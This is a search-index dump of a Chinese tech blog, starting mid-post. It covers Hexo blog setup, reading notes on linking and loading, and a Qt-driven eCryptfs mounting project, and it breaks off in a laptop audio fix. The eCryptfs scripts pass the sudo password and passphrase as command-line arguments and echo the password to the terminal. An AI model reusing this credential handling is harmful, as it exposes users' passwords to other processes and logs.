Blog搭载平台空间不足 优势： 能够满足自己插入图片的需求，不用考虑空间问题 缺点： 所有文章中的图片受制于远程图床服务器的限制，如果服务器出现问题，所有图片都不能加载了  本地引用 绝对路径引用(我选择的方式，需要能够在首页上显示图片) 当Hexo项目中只用到少量图片时，可以将图片统一放在source/images文件夹中，通过markdown语法访问它们。\n source/images/image.jpg\n![](/images/image.jpg)\n 优势：图片既可以在首页内容中访问到，也可以在文章正文中访问到。\n相对路径引用 配置站点_config.yml文件 另外也可以将图片放在文章自己的目录中。文章的目录可以通过配置站点_config.yml来生成。\n _config.yml\n\u0026lsquo;post_asset_folder: true\u0026rsquo;\n 将post_asset_folder设为true后，执行命令：\n$ hexo new post_name\n在source/_posts中会生成文章post_name.md和同名文件夹post_name。将图片资源放在post_name中，文章就可以使用相对路径引用图片资源了。\n_posts/post_name/image.jpg\n 参考博文： 在 hexo 中无痛使用本地图片\n Markdown直接引用图片 ![](image.jpg)\n上述是markdown的引用方式，图片放在文章所在的目录下，或者子目录下，图片只能在文章中显示，但无法在首页中正常显示。\n如果希望图片在文章和首页中同时显示，可以使用标签插件语法。\n _posts/post_name/image.jpg\n {% asset_img image.jpg This is an image %}\r 远程图床引用 除了在本地存储图片，还可以将图片上传到一些免费的CDN服务中。比如Cloudinary提供的图片CDN服务，在Cloudinary中上传图片后，会生成对应的url地址，将地址直接拿来引用即可。\n 参考博文： 使Hexo文章图文并茂\n该篇文章详细讲解如何使用新浪微博图床来实现在Hexo文章中插入图片\n  Hexo的版本控制方式 我们将Hexo生出来的静态网站放到了Github Pages上面去托管了。而我们一般也在在本地搭建Hexo的环境，编写新文章，然后利用hexo deploy来发布到Git，那么对于本地的Hexo的原始文件怎么管理呢？管理Hexo的原始文件的好处是：\n 换电脑布置环境非常方便 不用担心本地环境挂了导致源文件流失，毕竟一折腾就容易搞坏环境的  我们可以把Hexo博客的源文件也Host在github上，这里我们可以选择把Hexo博客的源文件布置到和Blog同一个username.github.io仓库，也可以选择将Hexo的源文件推到新建的一个Github Repo.\n利用Github分支进行版本控制 利用分支进行版本控制的流程 通过新建一个hexo分支用于专门存放hexo代码。原先的master分支依然不变，作为hexo部署的分支。 每次在部署后，再把代码提交到hexo分支:\n  到达Blog的本地文件根目录，本地创建git仓库\ngit init\n  添加远程库\ngit remote add origin git@github.com:user.name/user.name.github.io\n注意，将其中的两个user.name置换成你自己的github名称\n  创建hexo分支\ngit checkout -b hexo\n  添加文件并提交，push到远程仓库\ngit add\n   可能出现的问题：如果你使用了第三方主题，在进行代码提交的时候，是无法将第三方主题提交到你的github repository中，会出现 untracked content的提示。\n**原因：**第三方主题自身就是一个git项目，是没有办法将比人的git项目通过add和commit的方式添加到自己的git repository的。\n解决方式： 删除第三方主题根目录下面的.git文件夹，再尝试提交git add\n 日常改动过程中的执行流程：   依次执行git add .、git commit -m \u0026ldquo;\u0026hellip;\u0026quot;、git push origin hexo指令将改动推送到GitHub（此时当前分支应为hexo）；\n  执行hexo g -d发布网站到master分支上。\n  本地资料丢失或者换电脑，在其他电脑上面修改博客的步骤流程  使用 git clone git@github.com:user.name/user.name.github.io.git(默认的分支为hexo) 在本地clone下来的user.name.github.io文件夹下面通过git bash依次执行以下指令：  npm install -g hexo-cli\rnpm install hexo --save\rnpm install hexo-deployer-git\r  参考博客\nGitHub Pages + Hexo搭建博客\nHexo博客代码版本控制\n 其他功能参考网页  博客首页的显示问题 内容全部显示，不收缩 解决方式：配置Next主题中的_config.yml里面的 auto_excerpt = true\n内容显示一部分，但是显示格式不是Markdown的格式 使用 替代 auto_excerpt\n添加文章阅读量统计与评论功能  为NexT主题添加文章阅读量统计功能\n hexo博客评论新神器——Valine\n 添加搜索功能 场景 博文多了之后，就需要一个搜索功能能够快速的找到自己以前的博客。所以在我们的博客上加入搜索功能是很有必要的一件事情。\n安装插件   直接在自己的博客文件夹下，点击鼠标右键选择Git Bash Here\nnpm install hexo-generator-searchdb --save\n  修改站点配置文件:博客根目录下的_config.yml文件，可以在任意位置加入：\n  search:\rpath: search.xml\rfield: post\rformat: html\rlimit: 10000\r PS:每个冒号后面都有空格。 修改主题配置文件 我的路径：/blog/themes/next下的_config.yml文件，进行编辑。\nlocal_search:\renable: true\r PS:冒号后面都有空格。 此时，部署到github，打开网页就可以看到搜索功能了，容易添加，使用起来很方便，推荐添加，增加网站友好度。\n 添加站内聊天对话功能  Hexo博客添加在线联系功能\n 添加RSS功能 基本步骤 安装 RSS 插件 在blog根目录下执行命令安装 RSS 插件: hexo-generator-feed\nnpm install hexo-generator-feed --save\n配置 RSS 插件 编辑 Hexo 的配置文件 _config.yml，添加以下代码\n# RSS 订阅插件\rplugin:\r- hexo-generator-feed\r#RSS 插件配置\rfeed:\rtype: rss2\rpath: rss.xml\rlimit: 20\rhub:\rcontent: true\r 主题开启 RSS 支持 NexT 主题，默认开启 RSS。其它主题请参考主题文档。\n生成 RSS 执行 hexo clean \u0026amp;\u0026amp; hexo g \u0026amp;\u0026amp; hexo d 重新生成博客文件并完成部署即可。\n添加显示文章最新更新时间 修改（博客主目录）/themes/next/layout/_macro/post.swig 文件，在\u0026lt;span class=\u0026quot;post-time\u0026quot;\u0026gt;...\u0026lt;/span\u0026gt;标签后添加:\n{%if post.updated and post.updated \u0026gt; post.date%}\r\u0026lt;span class=\u0026quot;post-updated\u0026quot;\u0026gt;\r\u0026amp;nbsp; | \u0026amp;nbsp; {{ __('post.updated') }}\r\u0026lt;time itemprop=\u0026quot;dateUpdated\u0026quot; datetime=\u0026quot;{{ moment(post.updated).format() }}\u0026quot; content=\u0026quot;{{ date(post.updated, config.date_format) }}\u0026quot;\u0026gt;\r{{ date(post.updated, config.date_format) }}\r\u0026lt;/time\u0026gt;\r\u0026lt;/span\u0026gt;\r{% endif %}\r 最后在文件中的效果为： 修改主题配置文件（博客主目录）``themes/next/_config.yml`，增加一行\ndisplay_updated: true\n如果需要中文支持，那么就需要在中文的文件里面添加updated的翻译： 博客配置文件中的 language 参数修改对应的语言配置文件（博客主目录）\n/themes/next/languages/zh_Hans.yml\n到这里就设置完成了，如果你在写文章的时候加入了Update的参数，那么就会显示为你加入的参数时间。 比如：updated: 2018-01-01 12:00:00 如果你没有加入参数，那么就会显示为这个文件的最后修改时间。\n问题 打开RSS的时候：出现错误提示  This page contains the following errors:\nerror on line 317 at column 18: PCDATA invalid Char value 11\nBelow is a rendering of the page up to the first error.\n 根据错误提示，用编辑器打开 public 目录下 的rss.xml 或 atom.xml。找到第317行18列，是一个未知字符小方块（原因应该是我从我的CSDN博客里面导出来的文章，出现了一些未知的问题）。根据小方块前后内容判断出来是哪个文章出现的问题。\n打开对应的打开对应文章的.md文档，找到相应的的位置，替换出问题的字符。\n重新生成 rss.xml 并部署: hexo clean \u0026amp;\u0026amp; hexo g \u0026amp;\u0026amp; hexo d\n问题解决\n关闭打赏功能 暂时不需要开通打赏功能，在theme-\u0026gt;next-\u0026gt;_config.yml文件中注释掉打赏模块。\n# Reward\r# reward_comment: Donate comment here\r# wechatpay: /images/wechatpay.jpg\r# alipay: /images/alipay.jpg\r#bitcoin: /images/bitcoin.png\r ","date":1525965231,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1525965231,"objectID":"bb6e55216b9705d819a4aa4c04b6882b","permalink":"http://www.guozet.me/post/Use-Hexo-to-built-my-Blog/","publishdate":"2018-05-10T15:13:51Z","relpermalink":"/post/Use-Hexo-to-built-my-Blog/","section":"post","summary":"使用Jekyll搭建在github上博客已经快一年了，但一年","tags":"Hexo","title":"使用Hexo+Next主题+Github搭建博客","type":"post"},{"authors":null,"categories":"Fundamentals of Compiling","content":"《程序员的自我修养\u0026ndash;链接、装载与库》第一章阅读笔记 Terry.Tang 原创作品转载请注明出处 《程序员的自我修养\u0026ndash;链接、装载与库》阅读笔记1/10 2017/4/18\n 一.基本概念 回顾计算机软硬件体系中的几个重要概念，在计算机繁多的硬件设备中，三个部件最为关键：重要处理器CPU、内存和I/0控制芯片。而我们程序员的目的就是充分利用这三个部分。\n南北桥结构  设计原因：分离低速设备和高速设备，简化单一的北桥结构的设计成本。 设计方式：南桥(ISA)负责处理低速设备\u0026mdash;Modern, Sound card, Printer等；北桥(PCI)负责处理高速设备\u0026mdash;内存，USB接口，图形设备等；南北桥硬件结构图如下图所示：  SMP和多核 对称多处理器(SMP,Symmetrical Multi-Processing）: 多个CPU并行，所处地位和功能一样，相互对称的。\n缺点：我们的程序并不能同时分解成多个不相干的子问题同时运行在各个CPU上；并且成本太高\n使用场合：大型数据库，网络服务器上，同时处理相互独立的大量请求\n改进方式：保留多个核心，共享价格昂贵的缓存部件\u0026mdash;\u0026ndash;多核处理器（Multi-core Processor）\n系统软件 可大致分为两类：\n1.平台软件\u0026mdash;操作系统，驱动程序，运行库，系统工具（应用程序）\n2.辅助程序开发\u0026mdash;编译器，汇编器，链接器等开发工具和开发库\n本书重点介绍：链接器，运行库和开发库\n计算机系统软件体系结构中\u0026ndash;分层结构的几个概念：      **接口(Interface)：**每个层次之间相互通信的通信协议，接口的下面层来提供并定义接口，接口的上面层来使用接口提供的功能\u0026mdash;-接口尽可能保持不变，向后兼容     中间层：除了硬件和应用程序，其他都是中间层  比如：系统调用接口的实现是通过软件中断(Software Interrupt)的方式提供的，Linux\u0026mdash;0x80中断号； Window\u0026mdash;0x2E号中断\n二.操作系统 **两个功能：**提供抽象的接口和管理硬件资源\n1.CPU利用率 演变方式：单一运行一个程序\u0026ndash;\u0026gt;多道运行程序\u0026ndash;\u0026gt;分手系统\u0026mdash;\u0026gt;多任务系统(使得多进程能很好共享CPU) 操作系统接管了所有的硬件资源，并且本身运行在一个受硬件保护的级别。所有的应用程序都以进程（Process）的方式运行在比操作系统权限更低的级别，每个进程都有独立的地址空间，使得进程之间的地址空间相互隔离。 多任务系统中：目前CPU分配方式比较流行的是抢占式(Preemptive)\u0026mdash;优先级决定\n2.I/O设备驱动 操作系统作为硬件层的上层，是对硬件的管理和抽象，其中的硬件设备驱动程序处理所有的硬件细节，它和操作系统内核一起运行在特权级，但和内核只有有一定的独立性。 设备驱动程序的开发工作一般由硬件厂家完成，操作系统为其提供相应的接口和框架，凡是按照这个接口和框架进行开发的驱动程序都能够。\n三.内存利用 当多任务系统出现之后，CPU的利用率得到提升，那么接下来有一个明显的问题：如何将计算机上有限的物理内存分配给多个程序使用\n原始的物理内存直接使用的方式存在以下几个问题：\n 地址空间不隔离：恶意的程序可以修改其他程序的内存数据，导致其他任务崩溃 内存使用效率低：程序执行时，监控程序需要将整个程序装入内存中开始运行，任务切换时候，内存不够，则将当前运行程序写回到磁盘中。\u0026mdash;大量数据换入换出，效率十分低下 程序运行的地址不确定：内存给程序的空闲区域的位置是不确定的，不利于编写程序，因为程序编写时，访问数据和指令跳转时的目的地址很多都是固定的。\n\u0026mdash;\u0026mdash;为了解决这几个问题，增加中间层\u0026mdash;虚拟地址，通过某些映射的方式，将整个虚拟地址转换成实际的物理地址。  1.解决隔离问题 程序的最佳执行环境：一个单一的地址空间，自己的CPU，占有整个计算机资源不用关心其他的程序。 地址空间概念：可想象成一个很大的数组，每个数组的元素是一个字节，而这个数组大小由地址空间的地址长度决定，比如32位（地址线决定是多少位）的地址空间位4GB。\n 地址空间可分为虚拟地址空间（Virtual Address Space） \u0026amp; 物理地址空间（Physical Address Space）\n 注意：物理地址空间可能是4G，但是可能由于内存条只有2G，所有有效的物理地址就只是前面2G了 解决地址空间不隔离和运行地址不确定的方式\u0026mdash;\u0026mdash;-分段(Segmentation)\n分段(Segmentation) 由操作系统设置映射函数,实际由硬件完成，将程序所需要的内存大小的虚拟空间映射到某个地址空间。 解决内存使用效率低下的问题\u0026mdash;\u0026mdash;-分页(Paging)\n分页(Paging)** 概念：把地址空间(虚拟\u0026amp;物理)人为地等分成固定大小的页，每一页的大小由硬件决定，或者硬件支持多种大小的页，由操作系统来选择决定页的大小。\n当我们把进程的虚拟地址空间按页分割，把常用的数据和代码页装载到内存中，把不常用的代码和数据保存到磁盘中，在需要用的时候再把它从磁盘中取出来即可(页错误中断)。\n![这里写图片描述](http://img.blog.csdn.net/20170418201138609?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdGFuZzE1MjQ1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\r 注意：虚拟存储的使用依靠MMU的部件(集成在CPU内部)来完成页映射。\n","date":1525871067,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1525871067,"objectID":"d177fd8992249872ffac8f6592d6d412","permalink":"http://www.guozet.me/post/Programmers-self-cultivation-link-loading-library/","publishdate":"2018-05-09T13:04:27Z","relpermalink":"/post/Programmers-self-cultivation-link-loading-library/","section":"post","summary":"《程序员的自我修养\u0026ndash;链接、装载与库》第一章阅读笔","tags":"Compiling","title":"程序员的自我修养--链接、装载与库_阅读笔记","type":"post"},{"authors":null,"categories":"Linux","content":"主要分为三个部分：\n 第一部分是交互脚本与自动化脚本(Ubuntu)\n第二部分是界面设计\n第三部分是开源项目代码的说明\n 用户使用的是基于QT的用户界面，可以选择需要加密的文件路径，已经加密之后的路径。当图形界面接收到这些信息之后，会将该信息转换成一段包含了8个参数的数据包传递给shell脚本进行处理。\n一.交互脚本与自动化脚本 1. 处理交互式过程的脚本 #!/usr/bin/expect\r#该文件是处理交互式过程的主要文件，用来对输出信息进行解析，并自动输入对应的信息\rset timeout 2\rset ecryptfs_real [lindex $argv 0]\r#真实文件路径,实际的加密文件位置\rset ecryptfs_mount [lindex $argv 1]\r#挂载点路径，解密文件的位置\rset tangpassword [lindex $argv 2]\r#用户密码\rset key_type1 [lindex $argv 3]\r#密码管理方式\rset Passphrase [lindex $argv 4]\r#文件加密密码\rset ecryptfs_type [lindex $argv 5]\r#文件加密类型\rset key_bytes [lindex $argv 6]\r#文件加密位数\rset ecryptfs_fspath [lindex $argv 7]\r#路径是否加密\rset ecryptfs_filename [lindex $argv 8]\r#文件名是否加密\rspawn sudo mount -t ecryptfs $ecryptfs_real $ecryptfs_mount#挂载加密文件系统\rexpect \u0026quot;password for tang:\u0026quot;\rsend \u0026quot;$tangpassword\\n\u0026quot;\r#填充用户密码\rexpect \u0026quot;Select key type to use for newly created files:\u0026quot;\rsend \u0026quot;$key_type1\\n\u0026quot;\rexpect\r#填充加密方式类型 \u0026quot;Passphrase:\u0026quot;\rsend \u0026quot;$Passphrase\\n\u0026quot;\r#填充文件加密密码\rexpect \u0026quot;aes\u0026quot;\rsend \u0026quot;$ecryptfs_type\\n\u0026quot;\r#填充文件加密类型\rexpect \u0026quot;Select key bytes:\u0026quot;\rsend \u0026quot;$key_bytes\\n\u0026quot;\r#填写文件加密位数\rexpect \u0026quot;Enable plaintext passthrough\u0026quot;\rsend \u0026quot;$ecryptfs_fspath\\n\u0026quot;\r#选择是否对路径加密\rexpect \u0026quot;Enable filename encryption\u0026quot;\rsend \u0026quot;$ecryptfs_filename\\r\u0026quot;\rinteract\r#选择是否对文件名加密\r#expect eof\r#exit\r 2. 与QT交互的脚本 #!/bin/bash\r##该脚本主要作用是接收QT传递过来的变量，并进行解析，之后，调用相应的交互处理脚本##接收QT传递过来的变量\rECRYPTFS_REAL=$1\t##获取加密路径\rPASSWD=$2\t##用户密码\rPASS_TYPE=$3\t##密码类型\rPASSPHRASE=$4\t##加密路径，挂载点\rECRYPTFS_TYPE=$5\t##加密类型\rECRYPTFS_BIT=$6\t##加密位数\rECRYPTFS_FS=$7\t##路径是否加密\rECRYPTFS_FILENAME=$8 ##文件名是否加密\rcount=0 ##初始值\rdir=\u0026quot;/tmp/mnt/ecryptfs$count\u0026quot; ##初始挂载点\recho \u0026quot;Ecryptfs加密程序启动中...\u0026quot;\recho \u0026quot;申请超级用户权限,请输入用户密码\u0026quot;\r##/bin/testpass\rdf 1\u0026gt;/tmp/1.txt 2\u0026gt;/dev/null\r##检测当前已经使用的挂载点，建立一个新的挂载点来使用\recho \u0026quot;已经挂载的加密目录有：\u0026quot;\rwhile cat /tmp/1.txt | grep -q $dir 2\u0026gt;/dev/null\r##挂载点 是否使用了\rdo\recho $dir\rlet count=$count+1 ##一定要是/bin/bash如是/bin/sh这里就会出错\rdir=\u0026quot;/tmp/mnt/ecryptfs$count\u0026quot; ###新挂载点\rdone\rrm /tmp/1.txt\recho \u0026quot;新增挂载目录：\u0026quot; ###创建新的挂载点\rif [ ! -d $dir ];then ##判断目录是否存在\rmkdir -p $dir ###建立新挂载点目录,选项p，可以创建连续文件夹\rfi\recho \u0026quot;加密程序启动，开始加密……\recho \u0026quot;请输入加密密码，选择加密方式：\u0026quot;\r## sudo mount -t ecryptfs $(pwd) $dir ### $( )为引用命令结果\r##调用交互脚本来处理和用户的交互过程\recho $ECRYPTFS_REAL $dir $PASSWD $ECRYPTFS_TYPE $ECRYPTFS_BIT $ECRYPTFS_FS $ECRYPTFS_FILENAME\r/bin/automount $ECRYPTFS_REAL $dir $PASSWD $PASS_TYPE $PASSPHRASE $ECRYPTFS_TYPE $ECRYPTFS_BIT $ECRYPTFS_FS $ECRYPTFS_FILENAME\r 3. 挂载点操作脚本 #!/bin/bash\r##用来对当前挂载点进行卸载删除\rcount=0\rdir=\u0026quot;/tmp/mnt/ecryptfs$count\u0026quot;\rgksudo df 1\u0026gt;/tmp/1.txt\rwhile cat /tmp/1.txt |grep -q $dir 2\u0026gt;/dev/null\t##检查现在存在的挂载\rdo\recho $dir\rlet count=$count+1\rsudo umount $dir \u0026amp;\u0026amp; rmdir $dir　##卸载挂载点，卸载成功的前提下删除挂载点\rdir=\u0026quot;/tmp/mnt/ecryptfs$count\u0026quot;\rdone\r 4. 添加到鼠标右键菜单的执行脚本 #!/bin/bash\r##添加到右键的执行脚本，用来打开QT交互式界面，获取用户的输入信息\r/home/tang/ecryptfs/imageconverter\r#/bin/ecryptfs_mounted.sh\u0026amp;\r 5. 在QT调用执行挂载脚本 #!/bin/bash\r##在QT中调用该脚本，该脚本的主要功能是执行挂载脚本ecryptfs_mounted.sh\rREALFILE=$1\rECRYPTFSPATH=\u0026quot;/bin/ecryptfs_mounted.sh $REALFILE\u0026quot;\recho $REALFILE 1\u0026gt;/TMP/2.txt\recho\r$ECRYPTFSPATH 1\u0026gt;\u0026gt;/tmp/2.txt\rexec\r$ECRYPTFSPATH\r#exec gnome-terminal -x\r$ECRYPTFSPATH\r#/bin/ecryptfs_mounted.sh\u0026amp;\r 二. ＱＴ界面程序设计 #include \u0026lt;QtGui\u0026gt;\r#include \u0026quot;convertdialog.h\u0026quot;\rConvertDialog::ConvertDialog(QWidget *parent)\r: QDialog(parent)\r{\rsetupUi(this); //创建并布局好所有的窗口部件\rpasswordEdit-\u0026gt;setEchoMode (QLineEdit::Password);//用户口令输入框\rfilepasswordEdit-\u0026gt;setEchoMode (QLineEdit::Password);//文件密码输入框\r}\rvoid ConvertDialog::on_browseButton_clicked()//选择路径按钮触发\r{\rQString initialName = sourceFileEdit-\u0026gt;text();//加密文件夹路径输入框\rif (initialName.isEmpty())\rinitialName = QDir::homePath();//为空，使用默认路径\rQString fileName =\rQFileDialog::getExistingDirectory(this, tr(\u0026quot;Choose File\u0026quot;),\rinitialName);//弹出计算机路径选择框，选择路径加密\rfileName = QDir::toNativeSeparators(fileName);//加密路径\rif (!fileName.isEmpty()) {\rsourceFileEdit-\u0026gt;setText(fileName);//将路径信息保存起来\r// buttonBox-\u0026gt;button(QDialogButtonBox::Ok)-\u0026gt;setEnabled(true);\r}\r}\rvoid ConvertDialog::on_passwordEdit_textEdited(const QString \u0026amp;arg1)//password密码框\r{\rQRegExp regx (\u0026quot;^[^ ]+$\u0026quot;);// 设定正则表达式，不能输入空格\rQValidator *validator=new QRegExpValidator(regx,this);\rpasswordEdit-\u0026gt;setValidator(validator);\rfilepasswordEdit-\u0026gt;setValidator(validator);//正则表达式控制输入框字符格式\r}\rvoid ConvertDialog::on_filepasswordEdit_textEdited(const QString \u0026amp;arg1)//filepassword密码框\r{\rQRegExp regx (\u0026quot;^[^ ]+$\u0026quot;);// 不能输入空格\rQValidator *validator2=new QRegExpValidator(regx,this);\rpasswordEdit-\u0026gt;setValidator(validator2);\rfilepasswordEdit-\u0026gt;setValidator(validator2);//正则表达式控制输入框字符格式\r}\rvoid ConvertDialog::on_shellButton_clicked()//确定加密按钮触发\r{\r//system(\u0026quot;/bin/ecryptfs_mounted.sh /home/tang/\u0026quot;); //直接调用的方式，会阻塞进程\r//QProcess::execute(\u0026quot;/opt/run\u0026quot;)　//调用QT里面的函数来实现，会阻塞进程\rpasswordEdit-\u0026gt;setInputMask(\u0026quot;\u0026quot;);//提取password输入框内容\rfilepasswordEdit-\u0026gt;setInputMask(\u0026quot;\u0026quot;);//提取filepassword输入框内容\rif(sourceFileEdit-\u0026gt;text().isEmpty()) // 必须输入加密路径，否则报错\r{\rQMessageBox::warning(this,tr(\u0026quot;worning\u0026quot;),tr(\u0026quot; Please select the path to encrypt !\u0026quot;),QMessageBox::Yes);//报错信息\rsourceFileEdit-\u0026gt;setFocus();//移动光标到加密路径输入框\r}\relse if(passwordEdit-\u0026gt;text().isEmpty()||filepasswordEdit-\u0026gt;text().isEmpty())//如果任一密码为空，直接报错\r{\rQMessageBox::warning(this,tr(\u0026quot;worning\u0026quot;),tr(\u0026quot; user password or file password can't be empty!\u0026quot;),QMessageBox::Yes);\r//报错信息\rpasswordEdit-\u0026gt;clear();//清空用户密码输入框\rfilepasswordEdit-\u0026gt;clear();//清空文件密码输入框\rpasswordEdit-\u0026gt;setFocus();//移动光标到用户密码输入框\r}\relse\r{\rQString p1=passwordEdit-\u0026gt;text().trimmed();//去除首尾空格\rQString f1=filepasswordEdit-\u0026gt;text().trimmed();// 去除首尾空格\rQString p2,f2;\rint length1=p1.length();\rint length2=f1.length();\rfor (int i=0;i\u0026lt;length1;i++)\r{if (p1[i]!=' ') p2+=p1[i];}//去除password中的空格\rfor (int i=0;i\u0026lt;length2;i++)\r{if (f1[i]!=' ') f2+=f1[i];}//去除filepassword中的空格\rQString define = p2+\u0026quot; \u0026quot;+\u0026quot;1 \u0026quot;+f2+\u0026quot; \u0026quot;+ecryptfstypeComboBox-\u0026gt;currentText().toLower()\r+\u0026quot; \u0026quot;+ecryptfsbitComboBox-\u0026gt;currentText().toLower()\r+\u0026quot; \u0026quot;+fileecryptfsComboBox-\u0026gt;currentText().toLower()\r+\u0026quot; \u0026quot;+filenameecryptfsComboBox-\u0026gt;currentText().toLower();//输出需要的信息\rqDebug()\u0026lt;\u0026lt;define;\rQString ecryptfs_sh = sourceFileEdit-\u0026gt;text()+\u0026quot; \u0026quot;+define;//写出保存的信息\r//ecryptfs_sh.insert(0,QString(\u0026quot;/bin/tangguoze \u0026quot;));\rqDebug()\u0026lt;\u0026lt;ecryptfs_sh;\rQStringList arguments;\rarguments \u0026lt;\u0026lt; ecryptfs_sh;//输出信息到脚本中\rQProcess *poc = new QProcess;//定义新进程\rpoc -\u0026gt; start (\u0026quot;/bin/tangguoze\u0026quot;,arguments);//在QT中调用启动进程运行\r}\r}\r 三．eCryptfs开源部分的分析 主要分为7个部分：\n  keystore\nKeystore部件从文件中提供文件头信息，并将信息数据转发给callout应用程序。Keystore与callout应用程序之前使用netlink机制通信，通信的发起者为keystore。\n  Callout应用程序\nCallout应用程序根据目标策略对头文件信息作出评估，并给出各种操作，如：调用后台给应用程序弹出对话框要求密码短语，或用私钥解密一个会话秘钥。\neCryptfs内核模块和用户空间秘钥管理代码之间的主要通信是请求秘钥，由内核秘钥环发起。Callout应用程序从目录分析策略信息，解析每个文件的头信息。为了满足挂起的公钥请求，他可以调用PKI API，或者用特殊的签名搜索带盐值得密码短语。\n  eCryptfs后台弹出对话框输入密码短语\n为了能给用户弹出对话框来输入密码短语，eCryptfs必须提供得到X会话的通道。这可能通过运行一个后台来实现。eCryptfs后台侦听一个socket，它的地址信息写在用户的会话秘钥环中，无论何时策略需要弹出一个对话框请求密码短语时，callout应用程序都能提取socket的地址信息，并用它请求后台给用户弹出对话框，接着，后台将用户的密码短语返回给callout应用程序。\n  内核秘钥环\n内核秘钥环用于管理和保护秘钥和认证特征。eCryptfs用内核秘钥环存储认证特征、节点加密统计信息和秘钥。\n  PAM\nPAM（可插入的认证模块）提供了灵活的认证机制。eCryptfs含有一个模块，能捕获用户注册的密码短语，并将它放在用户的会话秘钥环中，这个密码短语作为无盐值密码短语认证特征。 eCryptfs可以基于策略，使用这个密码短语进行加密操作。如：用这个密码短语从用户的GunPG秘钥环中提取他的私钥；通过字符串到秘钥操作，将这个密码短语直接用于保护文件的会话秘钥；这个秘钥短语还可以与存在TPM中的秘钥结合在一起，用来提供两个因子的认证，即用户为了访问一个文件，他必须注册到特殊主机，还需要使用特征的密码短语。\n  公钥设施\neCryptfs提供了可插入的PKI（公钥设施）接口，eCryptfs的PKI模块利用GPGME（GuuPG Made Easy）接口访问用户的GnuPG秘钥环。这个模块能使用用户的注册密码解密用户保存的私钥。\neCryptfs的TMP PKI模块的TrouSerS使用接口与TPM（可信平台模块）通信，用来使用存在硬件中的私钥，将文件绑定到一个特定的主机上。 eCryptfs openCryptoki PKCS#11框架PKI通过各种open Crytok的硬件设备，对在硬件上执行公钥操作的机制提供了支持。\n  目标中心策略（Target-centric Polocies）\n当应用程序创建一个新文件时，eCryptfs必须作出许多的决策，如：文件是否加密？用哪个对称密码加密数据？文件是否加入HMAC并附加IV？会话秘钥长度是多少？如何保护会话秘钥？等等。 eCryptfs将策略定义文件应用于目标。\neCryptfs文件系统由内核空间系统和用户空间系统两部分组成。内核空间系统由内核空间的内核keystore、内核加密API、eCryptfs层、加密元数据和底层文件系统组成。而用户空间由callout应用程序，eCryptfs后台和PKI API等组成。\n另外，eCryptfs文件系统使用了Linux内核的密钥环服务、Linux可插入认证模块(Pluggable Authentication Modules, PAM)、可信平台模块（Trusten Platform Module, TPM）和GnuPG密钥环，Ecryptfs超级块私有数据主要包括加密的各种信息，如：认证特征、密钥环等。\n  \r/* superblock private data. */\rstruct ecryptfs_sb_info {\rstruct super_block *wsi_sb;\rstruct ecryptfs_mount_crypt_stat mount_crypt_stat;\r};\r/* dentry private data. Each dentry must keep track of a lower\r* vfsmount too. */\rstruct ecryptfs_dentry_info {\rstruct path lower_path;\rstruct ecryptfs_crypt_stat *crypt_stat;\r};\r/* inode private data. */\rstruct ecryptfs_inode_info {\rstruct inode vfs_inode;\rstruct inode *wii_inode;\rstruct file *lower_file;\rstruct mutex lower_file_mutex;\rstruct ecryptfs_crypt_stat crypt_stat;\r};\r/* file private data. */\rstruct ecryptfs_file_info {\rstruct file *wfi_file;\rstruct ecryptfs_crypt_stat *crypt_stat;\r};\reCryptfs的认证特征包括会话密钥、口令和私钥等以及他们的签名。会话密钥将口令进行加密。结构eCryptfs_auth_toke存放了eCryptfs文件系统范围内的的认证特征。\r/* May be a password or a private key */\rstruct ecryptfs_auth_tok {\ru16 version; /* 8-bit major and 8-bit minor */\ru16 token_type;\r#define ECRYPTFS_ENCRYPT_ONLY 0x00000001\ru32 flags;\rstruct ecryptfs_session_key session_key;\ru8 reserved[32];\runion {\rstruct ecryptfs_password password;\rstruct ecryptfs_private_key private_key;\r} token;\r} __attribute__ ((packed));\r加密统计信息结构ecryptfs_crypt_stat存入了与每个加密文件相关的加密信息。如：文件的加密操作标识、文件头的结构信息等。列出如下：\r/**\r* This is the primary struct associated with each encrypted file.\r*\r* TODO: cache align/pack?\r*/\rstruct ecryptfs_crypt_stat {\r#define ECRYPTFS_STRUCT_INITIALIZED 0x00000001\r#define ECRYPTFS_POLICY_APPLIED 0x00000002\r#define ECRYPTFS_NEW_FILE 0x00000004\r#define ECRYPTFS_ENCRYPTED 0x00000008\r#define ECRYPTFS_SECURITY_WARNING 0x00000010\r#define ECRYPTFS_ENABLE_HMAC 0x00000020\r#define ECRYPTFS_ENCRYPT_IV_PAGES 0x00000040\r#define ECRYPTFS_KEY_VALID 0x00000080\r#define ECRYPTFS_METADATA_IN_XATTR 0x00000100\r#define ECRYPTFS_VIEW_AS_ENCRYPTED 0x00000200\r#define ECRYPTFS_KEY_SET 0x00000400\ru32 flags;\runsigned int file_version;\rsize_t iv_bytes;\rsize_t num_header_bytes_at_front;\rsize_t extent_size; /* Data extent size; default is 4096 */\rsize_t key_size;\rsize_t extent_shift;\runsigned int extent_mask;\rstruct ecryptfs_mount_crypt_stat *mount_crypt_stat;\rstruct crypto_blkcipher *tfm;\rstruct crypto_hash *hash_tfm; /* Crypto context for generating\r* the initialization vectors */\runsigned char cipher[ECRYPTFS_MAX_CIPHER_NAME_SIZE];\runsigned char key[ECRYPTFS_MAX_KEY_BYTES];\runsigned char root_iv[ECRYPTFS_MAX_IV_BYTES];\rstruct list_head keysig_list;\rstruct mutex keysig_list_mutex;\rstruct mutex cs_tfm_mutex;\rstruct mutex cs_hash_tfm_mutex;\rstruct mutex cs_mutex;\r};\r\r","date":1525788745,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1525788745,"objectID":"415ab16f5b541f3a3bb710fd15488377","permalink":"http://www.guozet.me/post/Linux-Transparent-Encrypted-File-System/","publishdate":"2018-05-08T14:12:25Z","relpermalink":"/post/Linux-Transparent-Encrypted-File-System/","section":"post","summary":"主要分为三个部分： 第一部分是交互脚本与自动化脚本(Ubunt","tags":"Linux","title":"Linux透明加密文件系统1_代码分析","type":"post"},{"authors":null,"categories":"Life","content":"There are some issues when I used my MSI GE60 2PG.\n1. Sound Blaster Cinema 1 Potential fix on Windows 10 A way to get Sound Blaster Cinema 1 fully functional on windows 10 x64 bit. This is a fix for those that attempt to open the program and immediately get a crash or no windows popping up and the system tray icon freezes.\n  Uninstalled both my realtek HD audio drivers via control panel, and uninstalled SBC. 